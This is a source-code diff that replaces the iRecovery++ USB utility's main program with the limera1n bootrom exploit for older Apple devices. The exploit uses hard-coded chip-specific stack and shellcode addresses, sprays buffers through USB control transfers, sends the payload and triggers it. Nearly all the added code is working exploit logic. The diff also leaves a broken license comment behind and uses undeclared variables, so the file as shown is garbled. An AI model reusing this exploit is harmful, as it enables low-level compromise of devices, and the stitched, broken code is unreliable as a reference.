@@ -1,6 +1,4 @@
-/***
- * iRecovery++ libusb based usb interface for iBoot and iBSS
- * Copyright (C) 2010  GreySyntax
+
  *
  * This program is free software: you can redistribute it and/or modify
  * it under the terms of the GNU General Public License as published by
@@ -15,172 +13,82 @@
  * You should have received a copy of the GNU General Public License
  * along with this program.  If not, see <http://www.gnu.org/licenses/>.
  */
+#include "limera1n.h"
+#include "libirecovery.h"
 
-#include <iostream>
-#include "Program.h"
+int limera1n_exploit() {
+irecv_error_t error = IRECV_E_SUCCESS;
+unsigned int i = 0;
+unsigned char buf[0x800];
+unsigned char shellcode[0x800];
+unsigned int max_size = 0x24000;
+//unsigned int load_address = 0x84000000;
+unsigned int stack_address = 0x84033F98;
+unsigned int shellcode_address = 0x84023001;
+unsigned int shellcode_length = 0;
 
-using namespace std;
 
-static IDevice Device;
-
-int main(int argc, char *argv[]) {
-	
-	cout << "iRecovery++  Copyright (C) 2010  GreySyntax\r\n";
-	cout << "This program comes with ABSOLUTELY NO WARRANTY; for details `./iRecovery -w'.\r\n";
-	cout << "This is free software, and you are welcome to redistribute it\r\n";
-	cout << "under certain conditions; type `./iRecovery -o' for details.\r\n" << endl;
-	
-	if (! (argc > 1)) {
-		
-		flags();
-		return -1;
-	}
-	
-	int c;
-	
-	while ((c = getopt(argc, argv, "acerosuwvh:")) != -1) {
-		
-		switch (c) {
-			
-			case 'a':
-				if (! Device.IsConnected() && ! Device.Connect()) {
-					
-					return -1;
-				}
-				
-				if (! Device.AutoBoot()) {
-					
-					return 1;
-				}
-				
-				break;
-				
-			case 'c':
-				if (! Device.IsConnected() && ! Device.Connect()) {
-				
-					return -1;
-				}
-				
-				if (Device.SendCommand(optarg)) {
-					
-					continue;
-				}
-
-				break;
-				
-			case 'e':
-				
-				cout << "Not implemented. :(" << endl;
-				break;
-				
-			case 'r':
-				if (! Device.IsConnected() && ! Device.Connect()) {
-				
-					return -1;
-				}
-				
-				Device.Reset();
-				break;
-				
-			case 'o':
-				conditions();
-				break;
-				
-			case 's':
-				if (! Device.IsConnected() && ! Device.Connect()) {
-				
-					return -1;
-				}
-				
-				Device.Shell();
-				break;
-				
-			case 'u':
-				if (! Device.IsConnected() && ! Device.Connect()) {
-			
-					return -1;
-				}
-			
-				if (! Device.Upload(optarg)) {
-				
-					continue;
-				}
-				break;
-			
-			case 'w':
-				warranty();
-				break;
-			
-			case 'v':
-				cout << "iRecovery++ " << VERSION << "," << endl;
-				cout << "Thanks to: lilstevie, pod2g, tom3q, planetbeing, geohot, posixninja and westbaer." << endl << endl;
-				break;
-				
-			case '?':
-			case 'h':
-				flags();
-				break;
-		}
-	}
-	
-	return 1;
+if (device->chip_id == 8930) {
+max_size = 0x2C000;
+stack_address = 0x8403BF9C;
+shellcode_address = 0x8402B001;
+}
+if (device->chip_id == 8920) {
+max_size = 0x24000;
+stack_address = 0x84033FA4;
+shellcode_address = 0x84023001;
 }
 
-void conditions() {
+memset(shellcode, 0x0, 0x800);
+shellcode_length = sizeof(limera1n_payload);
+memcpy(shellcode, limera1n_payload, sizeof(limera1n_payload));
 
-	cout << "All rights granted under this License are granted for the term of\r\n";
-	cout << "copyright on the Program, and are irrevocable provided the stated\r\n";
-	cout << "conditions are met.  This License explicitly affirms your unlimited\r\n";
-	cout << "permission to run the unmodified Program.  The output from running a\r\n";
-	cout << "covered work is covered by this License only if the output, given its\r\n";
-	cout << "content, constitutes a covered work.  This License acknowledges your\r\n";
-	cout << "rights of fair use or other equivalent, as provided by copyright law.\r\n";
-
-	cout << "You may make, run and propagate covered works that you do not\r\n";
-	cout << "convey, without conditions so long as your license otherwise remains\r\n";
-	cout << "in force.  You may convey covered works to others for the sole purpose\r\n";
-	cout << "of having them make modifications exclusively for you, or provide you\r\n";
-	cout << "with facilities for running those works, provided that you comply with\r\n";
-	cout << "the terms of this License in conveying all material for which you do\r\n";
-	cout << "not control copyright.  Those thus making or running the covered works\r\n";
-	cout << "for you must do so exclusively on your behalf, under your direction\r\n";
-	cout << "and control, on terms that prohibit them from making any copies of\r\n";
-	cout << "your copyrighted material outside their relationship with you.\r\n";
-
-	cout << "Conveying under any other circumstances is permitted solely under\r\n";
-	cout << "the conditions stated below.  Sublicensing is not allowed; section 10\r\n";
-	cout << "makes it unnecessary." << endl;
+debug("Resetting device counters\n");
+error = irecv_reset_counters(client);
+if (error != IRECV_E_SUCCESS) {
+error("%s\n", irecv_strerror(error));
+return -1;
 }
 
-void flags() {
-	
-	cout << endl;
-	cout << "-a\t\tenable auto-boot and reboot the device.\r\n";
-	cout << "-c <arg>\tsend a command to the device.\r\n";
-	cout << "-e <arg>\tupload a file and execute usb control exploit (0x21).\r\n";
-	cout << "-r\t\treset the usb connection.\r\n";
-	cout << "-o\t\tshow conditions of use.\r\n";
-	cout << "-s\t\tstart an interactive shell with iBoot/iBSS.\r\n";
-	cout << "-u <arg>\tupload a file to the device.\r\n";
-	cout << "-w\t\tshow warranty information.\r\n";
-	cout << "-v\t\tshow version information.\r\n";
-	cout << "-h\t\tthis information." << endl << endl;
+memset(buf, 0xCC, 0x800);
+for(i = 0; i < 0x800; i += 0x40) {
+unsigned int* heap = (unsigned int*)(buf+i);
+heap[0] = 0x405;
+heap[1] = 0x101;
+heap[2] = shellcode_address;
+heap[3] = stack_address;
 }
 
-void shutdown() {
-	
-	Device.Disconnect();
-	exit(1);
+debug("Sending chunk headers\n");
+irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);
+
+memset(buf, 0xCC, 0x800);
+for(i = 0; i < (max_size - (0x800 * 3)); i += 0x800) {
+irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);
 }
 
-void warranty() {
+debug("Sending exploit payload\n");
+irecv_control_transfer(client, 0x21, 1, 0, 0, shellcode, 0x800, 1000);
 
-	cout << "THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY\r\n";
-	cout << "APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT\r\n";
-	cout << "HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM \"AS IS\" WITHOUT WARRANTY\r\n";
-	cout << "OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,\r\n";
-	cout << "THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR\r\n";
-	cout << "PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM\r\n";
-	cout << "IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF\r\n";
-	cout << "ALL NECESSARY SERVICING, REPAIR OR CORRECTION." << endl;
+debug("Sending fake data\n");
+memset(buf, 0xBB, 0x800);
+irecv_control_transfer(client, 0xA1, 1, 0, 0, buf, 0x800, 1000);
+irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 10);
+
+//debug("Executing exploit\n");
+irecv_control_transfer(client, 0x21, 2, 0, 0, buf, 0, 1000);
+
+irecv_reset(client);
+irecv_finish_transfer(client);
+debug("Exploit sent\n");
+
+debug("Reconnecting to device\n");
+client = irecv_reconnect(client, 2);
+if (client == NULL) {
+debug("%s\n", irecv_strerror(error));
+error("Unable to reconnect\n");
+return -1;
+}
+
+return 0;
 }
